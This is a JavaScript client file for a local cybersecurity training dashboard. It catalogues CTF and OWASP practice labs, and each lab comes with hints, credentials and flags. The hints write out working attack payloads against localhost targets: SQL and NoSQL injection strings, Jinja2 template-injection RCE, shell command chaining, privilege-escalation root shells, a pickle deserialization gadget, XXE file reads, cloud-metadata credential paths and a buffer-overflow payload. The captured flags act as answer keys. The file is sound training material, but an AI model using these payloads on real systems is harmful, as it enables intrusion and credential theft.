// ==============================================================================
// CYBER TRAINING LAB SUITE - CLIENT APPLICATION LOGIC
// ==============================================================================

const LABS_DATA = [
    // --- Custom CTF Challenges ---
    {
        id: "ctf-sqli",
        name: "SQLi Vault & Auth Bypass",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "easy",
        difficultyDisplay: "🟢 Easy",
        port: 9001,
        url: "http://localhost:9001",
        difficulty: "Easy - Medium",
        owasp: ["A03: Injection", "A07: Auth Failures"],
        tags: ["SQL Injection", "UNION Extraction", "Auth Bypass", "SQLite"],
        description: "Exploit SQL Injection in product catalog search and admin login to exfiltrate secret flags and bypass password checks.",
        credentials: "Try SQLi: admin' -- or ' OR 1=1 --",
        hints: [
            "Search Catalog Payload: ' UNION SELECT 1, secret_name, 'secret', 0, secret_data FROM secret_vault --",
            "Admin Login Auth Bypass: admin' -- with any password",
            "Examine the SQL debug box to trace the injected syntax."
        ],
        flag: "CTF{5ql_1nj3ct10n_m4st3r_byp4ss_2026}"
    },
    {
        id: "ctf-ssrf",
        name: "Cloud IMDS SSRF Exfiltrator",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 9002,
        url: "http://localhost:9002",
        difficulty: "Medium",
        owasp: ["A10: SSRF", "A01: Access Control"],
        tags: ["SSRF", "Cloud Metadata", "AWS IAM", "Internal Pivot"],
        description: "Leverage an unvalidated server-side URL fetcher to probe internal microservices (127.0.0.1:8089) and dump cloud IAM keys.",
        credentials: "None required (Public URL Fetcher)",
        hints: [
            "Probe the internal service: http://127.0.0.1:8089/internal-admin",
            "Dump AWS IAM credentials: http://127.0.0.1:8089/latest/meta-data/iam/security-credentials/s3-backup-admin-role",
            "Notice how the server worker acts as a proxy for internal network requests."
        ],
        flag: "CTF{55rf_cl0ud_m3t4d4t4_3xf1ltr4t10n_9921}"
    },
    {
        id: "ctf-jwt",
        name: "TokenVault JWT Forgery",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 9003,
        url: "http://localhost:9003",
        difficulty: "Medium",
        owasp: ["A07: Identification & Auth", "A02: Cryptographic Failures"],
        tags: ["JWT", "Algorithm Confusion", "None Alg", "Secret Cracking"],
        description: "Analyze and forge JSON Web Tokens using algorithm confusion (alg: 'none') or dictionary attacks on weak HMAC secrets to gain admin privileges.",
        credentials: "Guest session assigned automatically via cookie",
        hints: [
            "Method 1: Change header alg to 'none', change payload role to 'admin', and strip the signature (leave trailing dot).",
            "Method 2: Use jwt_tool or hashcat with wordlist rockyou.txt to crack HMAC secret 'secret123' and re-sign as admin.",
            "Paste your forged token into the Custom Token submission form."
        ],
        flag: "CTF{jwt_n0n3_4lg_4nd_w34k_s3cr3t_f0rg3ry}"
    },
    {
        id: "ctf-ssti",
        name: "SSTI Jinja2 Dynamic Templater",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "hard",
        difficultyDisplay: "🔴 Hard",
        port: 9004,
        url: "http://localhost:9004",
        difficulty: "Hard",
        owasp: ["A03: Injection", "RCE"],
        tags: ["SSTI", "Jinja2", "Python MRO", "RCE"],
        description: "Inject arbitrary Python template expressions into the Jinja2 render pipeline to escape sandboxes and execute system commands.",
        credentials: "None required (Interactive Sandbox)",
        hints: [
            "Test expression injection with {{ 7 * 7 }}",
            "Inspect Python subclasses: {{ ''.__class__.__mro__[1].__subclasses__() }}",
            "Read the flag file: {{ cycler.__init__.__globals__.os.popen('cat /tmp/flag.txt').read() }}"
        ],
        flag: "CTF{55t1_j1nj42_rce_pyth0n_s4ndb0x_3sc4p3}"
    },
    {
        id: "ctf-cmd",
        name: "NetProbe OS Command Injection",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "easy",
        difficultyDisplay: "🟢 Easy",
        port: 9005,
        url: "http://localhost:9005",
        difficulty: "Easy",
        owasp: ["A03: Injection (Command Execution)"],
        tags: ["Command Injection", "Bash Chaining", "Reverse Shell", "OS Access"],
        description: "Bypass input sanitization in network ping diagnostics to chain operating system commands and read restricted system files.",
        credentials: "None required",
        hints: [
            "Try chaining operators: 127.0.0.1 ; ls -la /root",
            "Read flag config: 127.0.0.1 && cat /etc/secret_ctf_flag.conf",
            "Check environment variables: 127.0.0.1 | env"
        ],
        flag: "CTF{0s_c0mm4nd_1nj3ct10n_p1ng_pwn3d_4421}"
    },
    {
        id: "ctf-port-scanning",
        name: "Port Scanning & Service Recon Lab",
        category: "custom-ctf",
        categoryLabel: "Port Scanning",
        badgeClass: "badge-ctf",
        difficultyLevel: "easy",
        difficultyDisplay: "🟢 Easy",
        port: 8088,
        url: "http://localhost:8088",
        difficulty: "Easy",
        owasp: ["Network Enumeration", "Port Scanning", "Banner Grabbing"],
        tags: ["Nmap", "Port Scanning", "Service Enum", "SSH :2222", "HTTP :8088", "FTP :2121", "SMTP :2525", "DNS :5353"],
        description: "Practice Nmap port scanning and banner grabbing across 5 exposed services (SSH, HTTP, FTP, SMTP, DNS) to discover hidden flags and service configurations.",
        credentials: "FTP: ftpuser:your_secure_ftp_password | SSH: root:your_secure_password",
        hints: [
            "Scan open ports with Nmap: nmap -p 2121,2222,2525,5353,8088 -sV -sC localhost",
            "HTTP Flag (:8088): Browse http://localhost:8088 or curl http://localhost:8088",
            "FTP Flag (:2121): Connect via ftp -p localhost 2121, read /home/ftp/flag.txt",
            "SMTP Banner Flag (:2525): Connect with nc localhost 2525 or telnet localhost 2525",
            "DNS TXT Flag (:5353): Query dig @localhost -p 5353 flag.example.com TXT +short"
        ],
        flag: "POKHARA_HTTP_FLAG"
    },
    {
        id: "ctf-anon-services",
        name: "Anonymous Services & Misconfig Lab",
        category: "custom-ctf",
        categoryLabel: "Misconfigurations",
        badgeClass: "badge-ctf",
        difficultyLevel: "easy",
        difficultyDisplay: "🟢 Easy",
        port: 6379,
        url: "http://localhost:8000",
        difficulty: "Easy",
        owasp: ["A05: Security Misconfiguration", "Unauthenticated Services"],
        tags: ["Samba :445", "Redis :6379", "Anon FTP :2122", "smbclient", "redis-cli"],
        description: "Enumerate unauthenticated and anonymously accessible enterprise network services including public Samba shares, unauthenticated Redis key storage, and anonymous FTP.",
        credentials: "No password required (Anonymous access enabled)",
        hints: [
            "SMB Share: smbclient -N //localhost/public -p 445 -> get migration_backup_note.txt",
            "Redis Key Dump: redis-cli -p 6379 KEYS '*' -> GET flag",
            "Anonymous FTP: ftp -p localhost 2122 (User: anonymous / Pass: blank) -> get annual_audit.txt"
        ],
        flag: "CTF{smb_4n0nym0us_sh4r3_3xfl_8831}"
    },
    {
        id: "ctf-linux-privesc",
        name: "Linux Privilege Escalation Arena",
        category: "custom-ctf",
        categoryLabel: "PrivEsc & OS",
        badgeClass: "badge-ctf",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 2223,
        url: "http://localhost:8000",
        difficulty: "Medium",
        owasp: ["Privilege Escalation", "SUID Abuse", "Sudoers Misconfig", "Cron Hijacking"],
        tags: ["SSH :2223", "GTFOBins", "SUID /find", "sudo python3", "Cron /opt/backup.sh"],
        description: "Log in as low-privilege user 'student' via SSH and exploit multiple realistic Linux privilege escalation vectors (SUID find binary, NOPASSWD python3, world-writable root cron) to read /root/root_flag.txt.",
        credentials: "SSH: student : student123 (Port 2223)",
        hints: [
            "SSH Login: ssh -p 2223 student@localhost (Pass: student123)",
            "Vector 1 (SUID): find . -exec /bin/sh -p \\; -quit -> cat /root/root_flag.txt",
            "Vector 2 (Sudoers): sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
            "Vector 3 (Cron): echo 'cp /root/root_flag.txt /tmp/flag && chmod 777 /tmp/flag' >> /opt/scripts/backup.sh"
        ],
        flag: "CTF{l1nux_pr1v3sc_gtf0b1ns_m4st3r_7721}"
    },
    {
        id: "ctf-file-upload",
        name: "MediaVault File Upload & LFI Lab",
        category: "custom-ctf",
        categoryLabel: "File Security",
        badgeClass: "badge-ctf",
        difficultyLevel: "easy",
        difficultyDisplay: "🟢 Easy",
        port: 9006,
        url: "http://localhost:9006",
        difficulty: "Easy",
        owasp: ["A01: Broken Access Control", "A03: Injection (LFI)"],
        tags: ["LFI", "Path Traversal", "File Upload", "MIME Bypass"],
        description: "Exploit Local File Inclusion (LFI) in the dynamic document viewer to traverse directories and inspect system files, or test unrestricted file upload filters.",
        credentials: "None required (Interactive Portal)",
        hints: [
            "LFI Flag: Load ?page=/flag.txt in the dynamic viewer",
            "LFI Path Traversal: Load ?page=../../../../etc/passwd",
            "LFI Environment Read: Load ?page=/proc/self/environ"
        ],
        flag: "CTF{f1l3_upl04d_lf1_rce_byp4ss_9934}"
    },
    {
        id: "ctf-idor-banking",
        name: "Apex Global Bank IDOR & BOLA Lab",
        category: "custom-ctf",
        categoryLabel: "Access Control",
        badgeClass: "badge-ctf",
        difficultyLevel: "easy",
        difficultyDisplay: "🟢 Easy",
        port: 9007,
        url: "http://localhost:9007",
        difficulty: "Easy",
        owasp: ["A01: Broken Access Control", "API1: BOLA"],
        tags: ["IDOR", "BOLA", "Object Parameter Tampering", "Financial API"],
        description: "Logged in as Alice Parker (Account ID: 101), tamper with direct object references in query strings and API endpoints to access the high-net-worth VIP Executive Vault (ID: 1) and read confidential memos.",
        credentials: "Logged in as Alice Parker (#101)",
        hints: [
            "URL Parameter Tampering: Change address bar to http://localhost:9007/account?id=1",
            "API Endpoint: Fetch http://localhost:9007/api/account/1",
            "Inspect the confidential wire memo in the Chairman's account."
        ],
        flag: "CTF{1d0r_b0l4_pr1v1l3g3_3sc4l4t10n_8821}"
    },
    {
        id: "ctf-hash-cracking",
        name: "HashVault Credential Cracking Arena",
        category: "custom-ctf",
        categoryLabel: "Cryptography",
        badgeClass: "badge-ctf",
        difficultyLevel: "easy",
        difficultyDisplay: "🟢 Easy",
        port: 9008,
        url: "http://localhost:9008",
        difficulty: "Easy",
        owasp: ["A02: Cryptographic Failures", "Weak Hashing"],
        tags: ["MD5", "SHA-256", "John the Ripper", "Hashcat", "CyberChef"],
        description: "Inspect leaked corporate database hashes (MD5, SHA-256, SHA-1) and use dictionary attacks / hash lookup tools to recover the administrator's plaintext password.",
        credentials: "Admin MD5 Hash: e295de8b20967db5be602b9ee77e6827",
        hints: [
            "Admin MD5 Hash: e295de8b20967db5be602b9ee77e6827",
            "Cracked Plaintext: dragon123",
            "Submit 'dragon123' in the verification form to unlock the master flag."
        ],
        flag: "CTF{h4sh_cr4ck1ng_m4st3r_j0hn_h4shc4t_8832}"
    },
    {
        id: "ctf-xxe",
        name: "XXE Invoicer XML Entity Lab",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 9009,
        url: "http://localhost:9009",
        difficulty: "Medium",
        owasp: ["A05: Security Misconfiguration", "XXE Injection"],
        tags: ["XXE", "XML DTD", "File Exfiltration", "lxml"],
        description: "Submit crafted XML invoice documents with custom external DOCTYPE entity declarations to read /flag.txt and local system files.",
        credentials: "None required (Interactive Form)",
        hints: [
            "Define an external entity: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///flag.txt'> ]>",
            "Reference the entity in the customer tag: <customer>&xxe;</customer>",
            "Parse the invoice to view the rendered file contents."
        ],
        flag: "CTF{xx3_3xt3rn4l_3nt1ty_xpl01t_9912}"
    },
    {
        id: "ctf-nosqli",
        name: "NoSQL Gateway Injection Arena",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 9010,
        url: "http://localhost:9010",
        difficulty: "Medium",
        owasp: ["A03: Injection (NoSQL)", "A07: Identification & Auth"],
        tags: ["NoSQL Injection", "MongoDB Operators", "$ne Auth Bypass", "$regex Blind Exfil"],
        description: "Inject MongoDB dictionary operators into JSON authentication and user lookup endpoints to bypass password validation and extract hidden tokens with regex.",
        credentials: "Try JSON: {\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}",
        hints: [
            "Auth Bypass: POST /api/login with {\"username\": \"admin\", \"password\": {\"$ne\": \"invalid\"}}",
            "Blind Extraction: POST /api/user/lookup with {\"username\": \"admin\", \"secret_token\": {\"$regex\": \"^CTF{.*\"}}",
            "Iterate characters using $regex to discover the exact flag string."
        ],
        flag: "CTF{n05ql_1nj3ct10n_m0ng0_0p3r4t0r_pwnd_8812}"
    },
    {
        id: "ctf-deserialization",
        name: "PickleVault Insecure Deserialization",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 9011,
        url: "http://localhost:9011",
        difficulty: "Medium",
        owasp: ["A08: Software & Data Integrity", "RCE"],
        tags: ["Insecure Deserialization", "Python Pickle", "__reduce__", "Cookie Tampering"],
        description: "Analyze Base64-serialized Python Pickle session cookies and forge a custom __reduce__ gadget object to execute commands and retrieve /flag.txt.",
        credentials: "Cookie user_pref generated automatically",
        hints: [
            "Use Python pickle.dumps() on a class implementing __reduce__.",
            "Payload pattern: def __reduce__(self): return (os.system, ('cat /flag.txt > /tmp/out',))",
            "Encode the resulting pickled bytes in Base64 and inject into user_pref cookie."
        ],
        flag: "CTF{p1ckl3_d353r14l1z4t10n_rc3_pwn4g3_9941}"
    },
    {
        id: "ctf-race-condition",
        name: "Race Condition Bank & Store",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 9012,
        url: "http://localhost:9012",
        difficulty: "Medium",
        owasp: ["A04: Insecure Design", "Concurrency / TOCTOU"],
        tags: ["Race Condition", "TOCTOU", "Multi-Threading", "Double Spending"],
        description: "Exploit a Time-of-Check to Time-of-Use (TOCTOU) gap in single-use voucher validation by sending rapid concurrent requests to accumulate $1,000+ and purchase the VIP Flag.",
        credentials: "Promo voucher: DISCOUNT2026",
        hints: [
            "Redeem code DISCOUNT2026 using parallel asynchronous requests.",
            "Use the built-in Concurrency Turbo Cannon or Python threading to fire 25 parallel requests.",
            "Once balance reaches $1,000, buy the VIP CTF Master Flag from the store."
        ],
        flag: "CTF{r4c3_c0nd1t10n_t0ct0u_mult1thr34d_pwn3d_7719}"
    },
    {
        id: "ctf-graphql-vault",
        name: "GraphQL Vault & Schema Introspection",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "hard",
        difficultyDisplay: "🔴 Hard",
        port: 9013,
        url: "http://localhost:9013",
        difficulty: "Hard",
        owasp: ["API Security", "GraphQL Introspection"],
        tags: ["GraphQL", "Introspection", "Hidden Schemas", "Mutations"],
        description: "Leverage enabled GraphQL schema introspection to uncover administrative types, sensitive queries (vaultInspection), and execute privileged mutations.",
        credentials: "None required (Public GraphQL Endpoint)",
        hints: [
            "Dump schema: { __schema { types { name fields { name } } } }",
            "Inspect secret vault query: { vaultInspection(accessCode: \"ADMIN_DEBUG\") { confidentialFlag masterPasscode } }",
            "Trigger mutation: mutation { unlockVaultFlag(masterPasscode: \"nexus_shadow_protocol_2026\") { flag } }"
        ],
        flag: "CTF{gr4phql_1ntr0sp3ct10n_s3cr3t_sch3m4_8819}"
    },
    {
        id: "ctf-cors-csrf",
        name: "Aura Identity CORS & CSRF Portal",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 9014,
        url: "http://localhost:9014",
        difficulty: "Medium",
        owasp: ["A01: Broken Access Control", "CORS Misconfiguration"],
        tags: ["CORS", "Origin Reflection", "Credential Theft", "CSRF"],
        description: "Exploit arbitrary Origin reflection with Access-Control-Allow-Credentials: true from an external attacker origin to siphon authenticated user data and API flags.",
        credentials: "Session cookie aura_auth_session created on load",
        hints: [
            "Notice /api/profile reflects the Origin request header with credentials: true.",
            "Open the built-in /attacker-sandbox page to simulate the external attacker site.",
            "Execute fetch('/api/profile', {credentials: 'include'}) to extract confidential_flag."
        ],
        flag: "CTF{c0rs_m1sc0nf1g_cr3d3nt14l_th3ft_4419}"
    },
    {
        id: "ctf-pwn-bof",
        name: "PWN Arena: 64-Bit Stack Buffer Overflow",
        category: "custom-ctf",
        categoryLabel: "Binary Exploitation (PWN)",
        badgeClass: "badge-ctf",
        difficultyLevel: "hard",
        difficultyDisplay: "🔴 Hard",
        port: 9015,
        url: "http://localhost:8000",
        difficulty: "Hard",
        owasp: ["Binary Exploitation", "Memory Corruption", "Buffer Overflow"],
        tags: ["PWN", "Buffer Overflow", "gets()", "Ret2Win", "x86_64", "socat :9015"],
        description: "Connect to a 64-bit Linux binary via netcat/socat on TCP port 9015. Exploit an unbounded gets() buffer overflow to overwrite RIP and redirect execution to print_flag().",
        credentials: "Connect via: nc localhost 9015",
        hints: [
            "Buffer size is 64 bytes + 8 bytes saved RBP = 72 bytes offset to RIP.",
            "The program prints the memory address of print_flag() upon connecting.",
            "Craft payload: python3 -c \"import sys; sys.stdout.buffer.write(b'A'*72 + p64(target_addr))\" | nc localhost 9015"
        ],
        flag: "CTF{buff3r_0v3rfl0w_r3t2w1n_pwn_m4st3r_64b1t_8829}"
    },
    {
        id: "ctf-ws-hijack",
        name: "Aether Ops WebSocket Hijacking (CSWSH)",
        category: "custom-ctf",
        categoryLabel: "Custom CTF",
        badgeClass: "badge-ctf",
        difficultyLevel: "hard",
        difficultyDisplay: "🔴 Hard",
        port: 9016,
        url: "http://localhost:9016",
        difficulty: "Hard",
        owasp: ["A01: Broken Access Control", "CSWSH"],
        tags: ["WebSockets", "CSWSH", "Origin Sniffing", "Real-Time Intercept"],
        description: "Establish cross-site WebSocket connections without Origin validation to eavesdrop on live internal system audit broadcasts and extract confidential tokens.",
        credentials: "None required (Open WebSocket /ws)",
        hints: [
            "The WebSocket handshake at /ws does not validate Origin headers.",
            "Connect via the Attacker CSWSH Workbench or run new WebSocket('ws://localhost:9016/ws').",
            "Listen for automated broadcasts from System Daemon to capture the operational token."
        ],
        flag: "CTF{csw5h_w3bs0ck3t_h1j4ck_0r1g1n_pwn_5512}"
    },

    // --- Modern Web Labs ---
    {
        id: "lab-juiceshop",
        name: "OWASP Juice Shop",
        category: "web-modern",
        categoryLabel: "Modern Web",
        badgeClass: "badge-modern",
        difficultyLevel: "hard",
        difficultyDisplay: "🔴 Hard",
        port: 3001,
        url: "http://localhost:3001",
        difficulty: "Advanced (100+ Challenges)",
        owasp: ["Entire OWASP Top 10", "XSS", "SQLi", "CSRF", "XXE", "Broken Auth"],
        tags: ["Node.js", "Angular", "REST API", "Scoreboard", "Gamified"],
        description: "The most modern and sophisticated insecure web application. Includes a gamified scoreboard covering the entire OWASP Top 10.",
        credentials: "Register a new user or use admin' --",
        hints: [
            "Access hidden Score Board by navigating to http://localhost:3001/#/score-board",
            "Try SQL injection during login: ' OR 1=1 --",
            "Look for confidential documents in public directories (/ftp)."
        ],
        flag: null
    },
    {
        id: "lab-webgoat",
        name: "OWASP WebGoat & WebWolf",
        category: "web-modern",
        categoryLabel: "Modern Web",
        badgeClass: "badge-modern",
        difficultyLevel: "hard",
        difficultyDisplay: "🔴 Hard",
        port: 8080,
        url: "http://localhost:8080/WebGoat",
        difficulty: "Structured Lessons",
        owasp: ["A01-A10 Complete Lessons", "Java/Spring Security", "XXE", "SSRF"],
        tags: ["Java", "Spring Boot", "WebWolf Mail/Landing", "Interactive"],
        description: "Deliberately insecure application designed to teach Web application security lessons with built-in WebWolf mailbox receiver.",
        credentials: "Create any username/password on the registration screen",
        hints: [
            "WebGoat UI: http://localhost:8080/WebGoat",
            "WebWolf Mail Catcher: http://localhost:9090/WebWolf",
            "Follow the guided step-by-step interactive lessons."
        ],
        flag: null
    },

    // --- Classic Web Labs ---
    {
        id: "lab-dvwa",
        name: "Damn Vulnerable Web App (DVWA)",
        category: "web-classic",
        categoryLabel: "Classic Web",
        badgeClass: "badge-classic",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 8081,
        url: "http://localhost:8081",
        difficulty: "Low to Impossible Modes",
        owasp: ["SQLi", "XSS (Stored/Reflected/DOM)", "Command Injection", "File Inclusion", "CSRF"],
        tags: ["PHP", "MySQL", "Adjustable Security", "Classic Standard"],
        description: "The gold standard PHP/MySQL vulnerable web application with 4 adjustable difficulty levels (Low, Medium, High, Impossible).",
        credentials: "admin : password (Click 'Create / Reset Database' on first launch)",
        hints: [
            "First visit: Click 'Create / Reset Database' button at the bottom of the setup screen.",
            "Navigate to 'DVWA Security' in the sidebar to toggle between Low, Medium, and High.",
            "Test Command Injection, File Inclusion (LFI/RFI), and Stored XSS."
        ],
        flag: null
    },
    {
        id: "lab-bwapp",
        name: "bWAPP (buggy Web Application)",
        category: "web-classic",
        categoryLabel: "Classic Web",
        badgeClass: "badge-classic",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 8082,
        url: "http://localhost:8082/install.php",
        difficulty: "100+ Vulnerabilities",
        owasp: ["A1-A10", "Heartbleed", "CORS", "SSRF", "Directory Traversal"],
        tags: ["PHP", "MySQL", "100+ Bugs", "OWASP Matrix"],
        description: "Extremely buggy PHP application featuring over 100 web vulnerabilities spanning all major OWASP Top 10 categories.",
        credentials: "bee : bug (Navigate to install.php to initialize database)",
        hints: [
            "Visit http://localhost:8082/install.php and click 'here' to initialize the database.",
            "Log in with username 'bee' and password 'bug'.",
            "Choose a vulnerability from the dropdown menu and set security level to Low."
        ],
        flag: null
    },
    {
        id: "lab-mutillidae",
        name: "OWASP Mutillidae II",
        category: "web-classic",
        categoryLabel: "Classic Web",
        badgeClass: "badge-classic",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 8083,
        url: "http://localhost:8083",
        difficulty: "Beginner to Expert",
        owasp: ["OWASP Top 10 2007-2021", "HTML5 Storage", "Clickjacking", "XML Injection"],
        tags: ["PHP", "MySQL", "Hints En Route", "Pen Testing Target"],
        description: "Feature-rich training target with built-in hints, tutorials, and vulnerability descriptions for realistic exploitation.",
        credentials: "admin : adminpass (Click 'Setup/reset the DB' if prompted)",
        hints: [
            "If database error appears, click 'Setup / reset the DB' in the top menu.",
            "Enable 'Hints and Tutorials' mode to learn underlying mechanics while attacking.",
            "Test for SQL injection, LDAP injection, and DOM-based vulnerabilities."
        ],
        flag: null
    },
    {
        id: "lab-xvwa",
        name: "XVWA (Xtreme Vulnerable Web App)",
        category: "web-classic",
        categoryLabel: "Classic Web",
        badgeClass: "badge-classic",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 8084,
        url: "http://localhost:8084/xvwa/setup/",
        difficulty: "Medium",
        owasp: ["SQLi", "XSS", "Unrestricted Upload", "PHP Object Injection"],
        tags: ["PHP", "Object Injection", "Modern Exploits"],
        description: "Instructional PHP application designed to demonstrate newer vulnerability types like PHP Object Injection and Session Fixation.",
        credentials: "admin : admin (Run setup script first)",
        hints: [
            "Visit http://localhost:8084/xvwa/setup/ and click 'Setup / Reset Database'.",
            "Try PHP Object Injections and serialize() exploit payloads."
        ],
        flag: null
    },

    // --- API & GraphQL Labs ---
    {
        id: "lab-dvga",
        name: "Damn Vulnerable GraphQL App (DVGA)",
        category: "api-graphql",
        categoryLabel: "GraphQL & API",
        badgeClass: "badge-api",
        difficultyLevel: "hard",
        difficultyDisplay: "🔴 Hard",
        port: 5013,
        url: "http://localhost:5013",
        difficulty: "Advanced API",
        owasp: ["GraphQL Top 10", "Introspection", "Batching Attacks", "DoS", "IDOR"],
        tags: ["Python", "GraphQL", "GraphiQL", "API Security"],
        description: "Specialized lab for learning GraphQL security, introspection queries, query complexity bypasses, authorization flaws, and injection.",
        credentials: "None required (Interactive GraphQL Playground)",
        hints: [
            "Access the GraphiQL playground at http://localhost:5013/graphiql",
            "Send an introspection query: { __schema { types { name fields { name } } } }",
            "Test circular query DoS and alias-based query batching attacks."
        ],
        flag: null
    },
    {
        id: "lab-vapi",
        name: "vAPI (Vulnerable API)",
        category: "api-graphql",
        categoryLabel: "GraphQL & API",
        badgeClass: "badge-api",
        difficultyLevel: "medium",
        difficultyDisplay: "🟡 Medium",
        port: 8085,
        url: "http://localhost:8085",
        difficulty: "Medium",
        owasp: ["OWASP API Security Top 10", "BOLA / IDOR", "Mass Assignment", "Rate Limiting"],
        tags: ["PHP/Laravel", "REST API", "Postman Collection", "API Top 10"],
        description: "Deliberately vulnerable REST API modeled around OWASP API Security Top 10 scenarios (BOLA, Broken Object Level Auth, Mass Assignment).",
        credentials: "Use provided Postman collection or Curl",
        hints: [
            "Inspect API schema and endpoints using Postman or Burp Suite.",
            "Test for BOLA by manipulating user IDs in GET/PUT requests.",
            "Test Mass Assignment by appending 'is_admin': true to registration JSON payloads."
        ],
        flag: null
    }
];

// State Management
let currentFilter = "all";
let currentDifficulty = "all";
let capturedFlags = JSON.parse(localStorage.getItem("ctf_captured_flags") || "[]");

// DOM Elements
const labsGrid = document.getElementById("labsGrid");
const labSearchInput = document.getElementById("labSearchInput");
const filterBtns = document.querySelectorAll(".filter-btn");
const diffBtns = document.querySelectorAll(".diff-btn");
const checkStatusBtn = document.getElementById("checkStatusBtn");
const flagForm = document.getElementById("flagForm");
const flagInput = document.getElementById("flagInput");
const flagFeedback = document.getElementById("flagFeedback");
const capturedFlagsList = document.getElementById("capturedFlagsList");
const flagsCapturedCount = document.getElementById("flagsCapturedCount");
const resetProgressBtn = document.getElementById("resetProgressBtn");
const labModal = document.getElementById("labModal");
const modalCloseBtn = document.getElementById("modalCloseBtn");
const modalBody = document.getElementById("modalBody");

// CLI Snippet Switching
const cliSnippetCode = document.getElementById("cliSnippetCode");
const copyCliBtn = document.getElementById("copyCliBtn");
const cliTabs = document.querySelectorAll(".cli-tab");

const CLI_COMMANDS = {
    ps: ".\\launch.ps1 -Profile custom-ctf",
    bash: "./launch.sh -p custom-ctf",
    compose: "docker compose --profile custom-ctf up -d"
};

cliTabs.forEach(tab => {
    tab.addEventListener("click", () => {
        cliTabs.forEach(t => t.classList.remove("active"));
        tab.classList.add("active");
        const type = tab.dataset.cmd;
        cliSnippetCode.textContent = CLI_COMMANDS[type] || CLI_COMMANDS.ps;
    });
});

copyCliBtn.addEventListener("click", () => {
    navigator.clipboard.writeText(cliSnippetCode.textContent);
    copyCliBtn.textContent = "✅ Copied!";
    setTimeout(() => { copyCliBtn.textContent = "📋 Copy"; }, 2000);
});

// Render Labs
function renderLabs() {
    const search = labSearchInput.value.toLowerCase().trim();
    labsGrid.innerHTML = "";

    const filtered = LABS_DATA.filter(lab => {
        const matchesCategory = (currentFilter === "all" || lab.category === currentFilter);
        const matchesDifficulty = (currentDifficulty === "all" || lab.difficultyLevel === currentDifficulty);
        const matchesSearch = !search || 
            lab.name.toLowerCase().includes(search) || 
            lab.description.toLowerCase().includes(search) || 
            lab.tags.some(t => t.toLowerCase().includes(search)) ||
            lab.owasp.some(o => o.toLowerCase().includes(search));
        return matchesCategory && matchesDifficulty && matchesSearch;
    });

    if (filtered.length === 0) {
        labsGrid.innerHTML = `
            <div style="grid-column: 1 / -1; text-align: center; padding: 3rem; color: var(--text-muted);">
                <h3>No vulnerability labs found matching your criteria</h3>
                <p style="margin-top: 0.5rem;">Try selecting 'All Labs', 'All Levels', or clearing your search query.</p>
            </div>
        `;
        return;
    }

    filtered.forEach(lab => {
        const isCtfSolved = lab.flag && capturedFlags.includes(lab.flag);
        
        const card = document.createElement("div");
        card.className = "lab-card";
        card.innerHTML = `
            <div>
                <div class="lab-card-header">
                    <div style="display: flex; gap: 0.4rem; align-items: center; flex-wrap: wrap;">
                        <span class="lab-badge ${lab.badgeClass}">${lab.categoryLabel}</span>
                        <span class="diff-badge diff-badge-${lab.difficultyLevel}">${lab.difficultyDisplay}</span>
                    </div>
                    <div class="lab-status-indicator" id="status-${lab.id}">
                        <span class="status-dot"></span>
                        <span class="status-text">Port :${lab.port}</span>
                    </div>
                </div>
                <h3 class="lab-title">${lab.name} ${isCtfSolved ? '⭐' : ''}</h3>
                <p class="lab-desc">${lab.description}</p>
                <div class="lab-meta-row">
                    ${lab.tags.map(t => `<span class="vuln-tag">${t}</span>`).join('')}
                </div>
            </div>
            <div class="lab-footer">
                <a href="${lab.url}" target="_blank" rel="noopener noreferrer" class="lab-port-link">
                    🚀 Launch Lab ↗
                </a>
                <div class="lab-actions-group">
                    <button class="btn-details" onclick="openLabModal('${lab.id}')">📖 Guide & Hints</button>
                </div>
            </div>
        `;
        labsGrid.appendChild(card);
    });

    updateFlagCount();
}

// Modal Details Handler
window.openLabModal = function(labId) {
    const lab = LABS_DATA.find(l => l.id === labId);
    if (!lab) return;

    modalBody.innerHTML = `
        <div style="display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.75rem; flex-wrap: wrap;">
            <span class="lab-badge ${lab.badgeClass}">${lab.categoryLabel}</span>
            <span class="diff-badge diff-badge-${lab.difficultyLevel}">${lab.difficultyDisplay}</span>
            <span style="font-family: var(--font-mono); font-size: 0.85rem; color: var(--accent); margin-left: auto;">Port: ${lab.port}</span>
        </div>
        <h2 style="color: #fff; font-size: 1.6rem; margin-bottom: 0.5rem;">${lab.name}</h2>
        <p style="color: var(--text-secondary); margin-bottom: 1.25rem;">${lab.description}</p>

        <h4 style="color: #fff; margin-bottom: 0.5rem; font-size: 0.95rem;">OWASP Top 10 Mapping:</h4>
